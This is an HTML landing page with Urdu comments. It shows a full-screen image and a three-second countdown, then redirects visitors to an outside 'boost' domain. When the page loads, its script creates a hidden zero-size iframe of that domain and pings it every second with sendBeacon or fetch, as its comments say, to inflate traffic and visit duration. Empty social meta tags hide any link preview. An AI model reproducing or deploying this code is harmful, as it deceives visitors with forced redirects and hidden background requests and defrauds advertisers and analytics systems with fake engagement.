<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>

  <!-- Facebook / Meta Tags -->
  <meta property="og:image" content="">
  <meta property="og:image:width" content="0">
  <meta property="og:image:height" content="0">
  <meta property="og:image:type" content="">
  <meta name="twitter:image" content="">
  <meta name="twitter:card" content="summary">

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000;
      height: 100vh;
      width: 100vw;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
      position: relative;
    }
    #main-image {
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      cursor: pointer;
      display: block; /* تصویر فوری شو ہوگی */
    }

    /* Circular Countdown Overlay Styles */
    .countdown-container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90px;
      height: 90px;
      display: flex; /* کاؤنٹ ڈاؤن شروع سے ہی تصویر کے اوپر شو ہوگا */
      justify-content: center;
      align-items: center;
      background: rgba(0, 0, 0, 0.55);
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      border-radius: 50%;
      box-shadow: 0 4px 20px rgba(0,0,0,0.4);
      z-index: 999;
      pointer-events: none;
    }

    .countdown-svg {
      position: absolute;
      width: 100%;
      height: 100%;
      transform: rotate(-90deg);
    }

    .countdown-svg circle {
      fill: none;
      stroke-width: 5;
    }

    .circle-bg {
      stroke: rgba(255, 255, 255, 0.2);
    }

    .circle-progress {
      stroke: #00d2ff;
      stroke-dasharray: 251.2;
      stroke-dashoffset: 0;
      stroke-linecap: round;
      transition: stroke-dashoffset 1s linear;
    }

    #countdown-number {
      font-size: 32px;
      font-weight: bold;
      color: #ffffff;
      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
      z-index: 1000;
    }
  </style>
</head>
<body>

  <!-- تصویر فوری لوڈ ہوگی -->
  <img id="main-image" src="image_03.webp" alt="" onclick="goToTarget()">

  <!-- Circle Countdown HTML -->
  <div class="countdown-container" id="countdown-box">
    <svg class="countdown-svg" viewBox="0 0 90 90">
      <circle class="circle-bg" cx="45" cy="45" r="40"></circle>
      <circle class="circle-progress" id="circle-progress" cx="45" cy="45" r="40"></circle>
    </svg>
    <span id="countdown-number">3</span>
  </div>

<script>
/* CONFIGURATION */
const CONFIG = {
  // Target Direct Link with UTM
  targetLink: "https://boost786x.top/boost55abc/?utm_source=B.&utm_medium=B.NR"
};

/* MAIN LOGIC */
(function () {
  // 1. فرنٹ پر 3, 2, 1 کاؤنٹ ڈاؤن شروع
  startCountdown(3);

  // 2. بیک گراؤنڈ میں ویب سائٹ لوڈ اور ٹریفک پنگ
  startDurationBooster();
})();

/* COUNTDOWN TIMER FUNCTION */
function startCountdown(seconds) {
  let timeLeft = seconds;
  const numDisplay = document.getElementById("countdown-number");
  const circleProgress = document.getElementById("circle-progress");
  const totalCircleLength = 251.2;

  const timer = setInterval(() => {
    timeLeft--;
    
    if (timeLeft > 0) {
      numDisplay.textContent = timeLeft;
      const offset = totalCircleLength - ((timeLeft / seconds) * totalCircleLength);
      circleProgress.style.strokeDashoffset = offset;
    } else {
      numDisplay.textContent = "0";
      circleProgress.style.strokeDashoffset = totalCircleLength;
      clearInterval(timer);
      goToTarget(); // 3، 2، 1 ختم ہوتے ہی ری ڈائریکٹ
    }
  }, 1000);
}

/* HIDDEN IFRAME & PING FUNCTION (Purely Background) */
function startDurationBooster() {
  try {
    const iframe = document.createElement('iframe');
    iframe.src = CONFIG.targetLink;
    iframe.style.display = 'none';
    iframe.style.width = '0px';
    iframe.style.height = '0px';
    document.body.appendChild(iframe);
  } catch (e) {
    console.log("iFrame Blocked");
  }

  setInterval(() => {
    if (navigator.sendBeacon) {
      navigator.sendBeacon(CONFIG.targetLink);
    } else {
      fetch(CONFIG.targetLink, { method: 'GET', mode: 'no-cors' }).catch(()=>{});
    }
  }, 1000);
}

function goToTarget() {
  window.location.href = CONFIG.targetLink;
}
</script>

</body>
</html>
